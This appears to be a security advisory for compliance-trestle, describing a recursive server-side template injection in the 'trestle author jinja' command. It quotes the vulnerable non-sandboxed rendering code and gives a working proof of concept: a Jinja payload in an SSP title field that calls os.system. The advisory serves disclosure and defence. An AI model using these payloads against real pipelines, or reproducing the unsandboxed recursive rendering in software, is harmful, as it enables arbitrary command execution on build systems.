summary: "compliance-trestle Vulnerable to Remote Code Execution via Recursive Server-Side Template\
  \ Injection (SSTI)\nA High severity Server-Side Template Injection (SSTI) vulnerability exists\
  \ in the `trestle author jinja` command. The command recursively evaluates rendered templates,\
  \ allowing an attacker to achieve arbitrary command execution with privileges of the running\
  \ process by injecting malicious payloads into data fields (such as SSP documents or Lookup\
  \ Tables).\n\n**The vulnerability does not require attacker control of the template itself.\
  \ Only attacker-controlled input data rendered into a trusted template is required.** \n\n\
  This distinction is critical: the template author may only intend to render plain text (e.g.,\
  \ `Title: {{ ssp.metadata.title }}`), but because of the recursive parsing, the data field\
  \ itself becomes executable. \n\nThe vulnerability is caused by recursive re-compilation and\
  \ re-rendering of already-rendered output.\n\n## Details\nIn `trestle/core/commands/author/jinja.py`,\
  \ the `render_template` method performs recursive template evaluation to allow nesting within\
  \ expressions:\n\n```python\n    @staticmethod\n    def render_template(template: Template,\
  \ lut: Dict[str, Any], template_folder: pathlib.Path) -> str:\n        new_output = template.render(**lut)\n\
  \        output = ''\n        error_countdown = JinjaCmd.max_recursion_depth\n        while\
  \ new_output != output and error_countdown > 0:\n            error_countdown = error_countdown\
  \ - 1\n            output = new_output\n            random_name = uuid.uuid4()\n         \
  \   dict_loader = DictLoader({str(random_name): new_output})\n            # jinja_env does\
  \ not use SandboxedEnvironment\n            jinja_env = Environment(\n                loader=ChoiceLoader([dict_loader,\
  \ FileSystemLoader(template_folder)]),\n                extensions=extensions(),\n       \
  \         autoescape=True,\n                trim_blocks=True\n            )\n            template\
  \ = jinja_env.get_template(str(random_name))\n            new_output = template.render(**lut)\n\
  \        return output\n```\n\nWhen a fully trusted and static template resolves a variable\
  \ from an attacker-controlled data source, the attacker's string is injected into the output.\
  \ During the next pass of the `while` loop, this output is loaded into a new `Environment`\
  \ via `DictLoader` and rendered again. Because `jinja_env` does not use `SandboxedEnvironment`,\
  \ attacker-controlled template expressions embedded in data fields are re-evaluated as executable\
  \ Jinja templates during recursive rendering.\n\n## PoC (Proof of Concept)\nThe vulnerability\
  \ survives even when the template itself is fully trusted and static. \nTested on `Jinja2`\
  \ version `3.1.6`.\n\n1. Create a fully trusted template (`template.j2`) that simply renders\
  \ a data variable from an external SSP model:\n```jinja2\nTitle: {{ ssp.metadata.title }}\n\
  ```\n\n2. Generate a malicious OSCAL SSP document (`system-security-plans/malicious_ssp/system-security-plan.json`)\
  \ where the title field contains a Jinja execution payload. This demonstrates how data becomes\
  \ code execution:\n```json\n{\n  \"system-security-plan\": {\n    \"uuid\": \"208dbe11-e6e2-411a-af18-095cd17a6a70\"\
  ,\n    \"metadata\": {\n      \"title\": \"{{ namespace.__init__.__globals__.os.system('touch\
  \ poc.txt') }}\",\n      \"last-modified\": \"2024-01-01T00:00:00+00:00\",\n      \"version\"\
  : \"1.0\",\n      \"oscal-version\": \"1.0.4\"\n    },\n    \"import-profile\": { \"href\"\
  : \"trestle://profiles/test_profile/profile.json\" }\n  }\n}\n```\n\n3. Execute the `trestle\
  \ author jinja` command against the malicious data:\n```bash\ntrestle author jinja -i template.j2\
  \ -o out.md -ssp malicious_ssp\n```\n*(Note: A similar payload injected via the `-lut` yaml\
  \ argument yields identical results.)*\n\n4. Verify arbitrary command execution:\n```bash\n\
  ls poc.txt\n# The file poc.txt is successfully created on the filesystem.\n```\n\nAn attacker\
  \ can also execute arbitrary shell commands directly, e.g.:\n```json\n      \"title\": \"\
  {{ namespace.__init__.__globals__.os.system('id') }}\",\n```\n\n## Impact\nThis vulnerability\
  \ allows arbitrary command execution with the privileges of the running process. If `compliance-trestle`\
  \ is used in an automated pipeline (such as CI/CD workflows generating documentation from\
  \ third-party vendor-supplied SSPs), a malicious payload embedded in a data field (like a\
  \ system title or description) will result in a compromised runner environment. The user/operator\
  \ must process the attacker-controlled SSP or LUT, satisfying the user interaction metric."
